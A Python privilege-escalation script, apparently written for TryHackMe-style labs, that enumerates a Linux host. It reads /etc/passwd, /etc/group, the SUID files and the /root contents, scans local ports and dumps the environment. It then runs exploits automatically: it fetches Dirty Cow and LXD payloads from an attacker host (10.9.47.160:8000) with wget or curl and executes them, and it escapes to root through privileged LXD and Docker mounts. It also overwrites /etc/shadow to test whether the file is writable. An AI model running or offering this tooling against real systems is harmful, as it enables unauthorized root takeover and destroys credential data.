#/usr/bin/python
#/usr/bin/python3

# Author: hackername
# search me on: try hack me at hackername

# Scope: Privilege escalation

# How it works:
# ////////////////////////////////////////////////////////////////////////////////////////////////////////


# This is a script that search some vulnerabilities or information on the system.
# IT WORKS ONLY ON BASH SYSTEMS so you can run it in Linux and Mac OS.
# If you want to change this script or customize it for you you can do it! It is open source!!!

# usage:
# $python rocket.py
# $python2 rocket.py
# $python3 rocket.py
# $python3.9 rocket.py


# ////////////////////////////////////////////////////////////////////////////////////////////////////////


# importing some libraries...

import os
import platform
import subprocess
import sys
import socket
from os import system
from zipfile import ZipFile


LHOST = '10.9.47.160'		# change this
LPORT = '8000'		# change this


# define some classes...
class color:
	red = '\033[31m'
	green = '\033[32m'
	yellow = '\033[33m'
	blue = '\033[34m'
	underline = '\033[4m'
	reset = '\033[0m'


# define some functions...

# open a file
def file(files):
	try:
		with open(files, 'r') as f:  # open file in input
			content = f.read()
			print(content)

	except (IOError, OSError) as e:
			print(color.red + str(e) + color.reset)
			print(color.red + "\n[-]" + files + " scan not completed!" + color.reset)

	except:
		print(color.red + "[-]ERROR: unknown error" + color.reset)
		print(color.red + "\n[-]" + files + " scan not completed!" + color.reset)



# take a look inside a dir...
def dir(path):

	try:
		# inputs
		directory = os.listdir(path)
		#						directory.replace('\n','')

		# searching the dirs...
		for files in directory:
			print("\n" + files)  # print file

	except (OSError, IOError) as e:
		print(color.red + str(e) + color.reset)
		print(color.red + "[-]" + path + " directory scan not completed" + color.reset)

	except:
		print(color.red + "[-]ERROR: unknown error" + color.reset)
		print(color.red + "[-]" + path + " directory scan not completed" + color.reset)


def control(files):

	try:
		with open(files, 'w') as f:  # open file in input
			content = "The file is writable (delete me)"  # change this

			# writing on the file
			f.write(content)
			f.close()

		print(color.green + "[+]the file is writable!" + color.reset)
		print(color.red + "[*]Control of the permissions of the " + files + " not completed" + color.reset)


	except (IOError, OSError) as e:
		print(color.red + "[-]" + str(e) + color.reset)

	except:
		print(color.red + "[-]ERROR: unknown error" + color.reset)
		print(color.red + "[-]Control of the permissions of the " + files + " not completed" + color.reset)

 

def ports(ip):

	try:

		for port in range(1,9999):
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 		# configuring socket
			result = sock.connect_ex((ip, port))		# connecting ip
			
			if result == 0:			# if port is open
				print(color.green + "port {}: open".format(port) + color.reset)

			sock.close 		# close connection


	except socket.error as error:
		print(color.red + "\n[-]an error occurred: " + error + color.reset)

	except socket.gaierror as error:
		print(color.red + "\n[-]an error occurred: " + error + color.reset )



def dirtyCow(LHOST, LPORT):
	print(color.yellow + color.underline + "\n" * 2 + "\ntesting Dirty Cow exploit..." + color.reset)

	try: 

		print(color.blue + "\ndownloading script..." + color.reset)
		
		try:
			os.system("wget " + LHOST + ":" + LPORT + "/exploits/dirtyCow.zip")		# downloading .zip archive
			
		except (IOError,OSError):
			os.system("curl -o dirtyCow.zip " + LHOST + ":" + LPORT + "/exploits/dirtyCow.zip")		# downloading .zip archive

		print(color.blue + "\nunzip archive..." + color.reset)
		with ZipFile('dirtyCow.zip', 'r') as dirty:
			dirty.extractall()		# unzip archive

		print(color.reset + "\nexecuting exploit..." + color.reset)
		os.system("chmod +x root")
		os.system("./root")		# executing script

	except (IOError, OSError) as error:
		print(color.red + "\n[-]there was an error: " + str(error) + color.reset)

	except:
		print(color.red + "download stopped due to an unkown error" + color.reset)


	finally:
		print(color.blue + "cleaning up" + color.reset)

		os.system("cd ~")
		os.system("rm root")
		os.system("rm -r dirtyCow.zip")		# cleanup



def banner():
	print('''
     |
    | |
   |   |
  |     |
 |this is|
|=========|
|    a    |
|         |
|    r    |
|    o    |
|    c    |
|    k    |
|    e    |
|    t    |
|         |
 |       |
  |     |
   |   |
   ==== 
  |7777|
 |777777|
|77777777|
|77777777|
|77777777|
|77777777|
 |777777| 
  |7777|
   |77|
    ||\n''')



# run program

# print(" started" + datetime.now())
print("\n" * 2)

# import terminal...
os.environ['TERM'] = 'screen'

# clear screen
os.system('clear')

# run program
print(color.green + color.underline + "the rocket has cleaned the launch tower!" + "\n" * 3 + color.reset)
print("\n")

banner()


# color legend
print(color.yellow + color.underline + "\n" * 3 + "Colors legend:" + color.reset)

print(color.yellow + "\n- Yellow for titles" + color.reset)
print(color.blue + "- Blue for neutral info" + color.reset)
print(color.green + "- Green for vulnerabilities and critical info" + color.reset)
print(color.red + "- Red for bankruptcy information" + color.reset)


# info about os
print(color.yellow + color.underline + "\n" * 2 + "OS info:" + color.reset)

# /etc/lsb-release file
print(color.yellow + "\n[*] /etc/lsb-release file:" + color.reset)
file('/etc/lsb-release')

# kernel version
print(color.yellow + "\nkernel version:" + color.reset)
kernel = platform.release()
print(platform.system())  # linux, windows ecc...
print(kernel)  # kernel
if kernel >= '5.8.0':
	print(color.red + "[-]the kernel has a good version" + color.reset)

else:
	print(color.green + "[+]the kernel has a old version, search for vulnerabilities" + color.reset)

# trying dirty cow exploit
dirtyCowMin = '2.6.22'
dirtyCowMax = '3.9'
if kernel >= dirtyCowMin and kernel <= dirtyCowMax:
	try:
		dirtyCow('10.9.47.160', '8000')			# change this

	except KeyboardInterrupt:
		print(color.red + 'Stoppped with ctrl+c' + color.reset)

# enviroment
print(color.yellow + "\nenviroment settings :" + color.reset)
os.system("printenv")

# user info
print(color.yellow + color.underline + "\n" * 2 + "users info:" + color.reset)

# user id, group ecc...
print(color.yellow + "\nid " + color.reset)
try:
	os.system("id")  # id info

except OSError as error:
	print(color.red + "[-]" + str(error) + color.reset)

except:
	print(color.red + "[-]ERROR: unknown error" + color.red)


# users in the system
print(color.yellow + "\nusers in the system:" + color.reset)
file('/etc/group')

# privileged users in the system
print(color.yellow + "\nprivileged users in the system:" + color.reset)
os.system('cat /etc/group | grep :0:')

# users with shell in the system
print(color.yellow + "\nusers with shell in the system:" + color.reset)
os.system('cat /etc/passwd |grep /bin/bash')

# programs
print(color.yellow + color.underline + "\n" * 2 + "programs:" + color.reset)

# sudo version 
print(color.yellow + "\n[*] sudo version:" + color.reset)
os.system('sudo -V')

# python version
print(color.yellow + "\npython version:" + color.reset)

v = sys.version
print(color.blue + "[*] your Python version is: " + color.reset + v)

# apache version
print(color.yellow + "\napache version " + color.reset)
os.system("httpd -v")

#running programs
print(color.yellow + "\nrunning programs:" + color.reset)

v = sys.version

if v <= "2.7.18":

	proc1 = subprocess.Popen(['ps', 'aux'], stdout=subprocess.PIPE)
	proc2 = subprocess.Popen(['grep', 'root'], stdin=proc1.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

	proc1.stdout.close()  # Allow proc1 to receive a SIGPIPE if proc2 exits.
	out, err = proc2.communicate()

	print('out: {0}'.format(out))
	print('err: {0}'.format(err))
	print(color.blue + "[*] program running as root  completed!" + color.reset)

else:
	os.system("ps aux | grep root")

	print(color.blue + "[*] program running as root  completed!" + color.reset)



# files + dir
print(color.yellow + color.underline + "\n" * 2 + "files + dir in the system:" + color.reset)

# suid files + sudoers files
print(color.yellow + "\nsuid + sudoers files:" + color.reset)

try:

	try:
		os.system("find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null")  # search with find

		try:
			os.system("sudo -l")  # use sudo -l

		except KeyboardInterrupt:
			print(color.red + '[-]Stopped whit ctrl+c' + color.reset)	

	except KeyboardInterrupt:  # if CTRL+C exit
		print(color.red + "[-]You pressed ctrl + c" + color.reset)
		print(color.red + "\n[*] Sudoers file  not completed!" + color.reset)

	except OSError as error:
		print(color.red + "[-]" + str(error) + color.reset)

	except:
		print(color.red + "[-]ERROR: unknown error" + color.reset)

except:
	print(color.red + "[-]SUID + SUDOERS file scan not completed" + color.reset)

# /etc/passwd
print(color.yellow + "\n/etc/passwd file:" + color.reset)
file('/etc/passwd')

# /etc/crontab
print(color.yellow + "\n/etc/crontab file:" + color.reset)
file('/etc/crontab')

# ssh keys
print(color.yellow + "\n/etc/ssh keys:" + color.reset)
dir('/etc/ssh')

# /var/log
print(color.yellow + "\n/var/log dir:" + color.reset)
dir('/var/log') 

# /var/log/apache*
print(color.yellow + "\n/var/log/apache* file:" + color.reset)

try:
	file('/var/log/apache')

except (IOError, OSError): 
	file('/var/log/apache2')

except:
	file('/var/log/apache3')

# /home dir
print(color.yellow + '\n' * 3 + 'home' + color.reset)
dir('/home')

# /root dir
print(color.yellow + '\n' * 3 + 'root' + color.reset)
dir('/root')

# /etc dir
print(color.yellow + '\n' * 3 + 'etc' + color.reset)
dir('/etc')

# /tmp dir
print(color.yellow + '\n' * 3 + 'tmp' + color.reset)
dir('/tmp')

# /opt dir
print(color.yellow + '\n' * 3 + 'opt' + color.reset)
dir('/opt')

# /media dir
print(color.yellow + '\n' * 3 + 'media' + color.reset)
dir('/media')

# /usr dir
print(color.yellow + '\n' * 3 + 'usr' + color.reset)
dir('/usr')

# /usr/sbin
print(color.yellow + '\n' * 3 + '/usr/sbin' + color.reset)
dir('/usr/sbin')

# /mnt dir
print(color.yellow + '\n' * 3 + 'mnt' + color.reset)
dir('/mnt')

# /bin
print(color.yellow + '\n' * 3 + 'bin' + color.reset)
dir('/bin')

# /sbin
print(color.yellow + '\n' * 3 + 'sbin' + color.reset)
dir('/sbin')

# /dev dir
print(color.yellow + '\n' * 3 + 'dev' + color.reset)
dir('/dev')

# /var/lib/mysql
print(color.yellow + "\n/var/lib/mysql dir:" + color.reset)
dir('/var/lib/mysql') 

# /var/www
print(color.yellow + "\n/var/www dir:" + color.reset)
dir('/var/www')

# /var/www/wp-config
print(color.yellow + "\n/var/www/wp-config file:" + color.reset)
file('/var/www/wp-config')


# control if some files is writable
print(color.yellow + "\nchecking if some files are writable..." + color.reset)
control('/etc/shadow')  

# checking if is present /opt/backup
print(color.yellow + "\nchecking if /opt/backup is present" + color.reset)
dir('/opt/backup')

# tasks/jobs
print(color.yellow + color.underline + "\n" * 2 + "tasks + jobs in the system:" + color.reset)

# running programs
print(color.yellow + "\nrunning programs:" + color.reset)
os.system("ps aux")

# cron jobs
print(color.yellow + "\n/etc/cron.d dir:" + color.reset)
dir('/etc/cron.d')



# networking
print(color.yellow + color.underline + "\n" * 2 + "networking:" + color.reset)

#interface configuration
print(color.yellow + "\ninterface configuration:" + color.reset)
os.system("ifconfig")

# arp history
print(color.yellow + "\narp history file:" + color.reset)
file('/proc/net/arp')

# fast port scanning
print(color.yellow + "\nopen ports in the system:" + color.reset)

ports('127.0.0.1')



# nfs config
print(color.yellow + color.underline + "\n" * 2 + "nfs configuration:" + color.reset)

# open *.conf files
print(color.yellow + "\nconfiguration files:" + color.reset)
os.system("find /etc | grep .conf")

def lxd_U_1804(LHOST, LPORT, image_Name, shell):
	print(color.yellow + color.underline + "\ntesting Ubuntu 18.04 lxd exploit" + color.reset)

	os.system("id |grep '108(lxd)'")

	try:

		print(color.blue + "\ndownloading script..." + color.reset)
		
		try:
			os.system("wget " + LHOST + ":" + LPORT + "/exploits/lxd1804.zip")	 		# downloading .zip archive
		
		except (IOError,OSError):
			os.system("curl -o lxd1804.zip " + LHOST + ":" + LPORT + "/exploits/lxd1804.zip")	 		# downloading .zip archive

		print(color.blue + "\nunzip archive..." + color.reset)
		with ZipFile('lxd1804.zip', 'r') as lxd:
			lxd.extractall()		# unzip archive

		print(color.blue + "\nimporting " + image_Name + " image..." + color.reset)
		os.system("lxc image import ./priv.tar.gz --alias " + image_Name) 		# importing image
		
		print(color.blue + "\nconfiguring ignite..." + color.reset)
		os.system("lxc init " + image_Name + " ignite -c security.privileged=true")			# configuring ignite
		
		print(color.blue + "\nadding ignite and image to lxd... " + color.reset)
		os.system("lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true")		# adding ignite + device
		
		print(color.blue + "\nstarting ignite..." + color.reset)
		os.system("lxc start ignite") 		# executing igniteSS

		print(color.blue + "\nspawning " + shell + " shell..." + color.reset)
		print("before you get root, for navigate in the system go to the /mnt/root directory!!!")
		print("happy hacking!")
		os.system("lxc exec ignite " + shell) 		# spawning /bin/sh shell

	except (OSError,IOError) as error:
		print(color.red + "\n[-]there was an error: " + str(error) + color.reset)

	except:
		print(color.red + "\n[-]there was an unkown error" + color.reset)

	finally:
		print(color.blue + "cleaning up" + color.reset)
		os.system("cd ")
		os.system("rm priv.tar.gz")
		os.system("rm -r lxd1804.zip")			# cleanup



# checking if 999(docker) privilege escalation is avable
def docker999():

	print('\n')
	os.system("id |grep '999(docker)'")

	print(color.blue + 'starting exploit...' + color.reset)

	print(color.yellow + 'user in 999(docker) container' + color.reset)
	os.system('docker run -v /root:/mnt alpine id')				# user in 999(docker)

	# instructions for sbawn a secure bash
	print(color.yellow + color.underline + '''
when appear the shell please run this following commands:
1- python3 (or python) -c 'import pty;pty.spawn("/bin/bash")' 
2- export TERM=xterm''' + color.reset)

	os.system('docker run -it -v /:/mnt alpine chroot /mnt')		# execting exploit


# executing exploits
lxd_U_1804(LHOST, LPORT, 'img', '/bin/sh')		# lxd

# dirtyCow(LHOST, LPORT)
docker999()				# docker

# end
print(color.green + color.underline + "\n" * 2 + "the rocket have touched the surface of mars" + "\n" * 3 + color.reset)
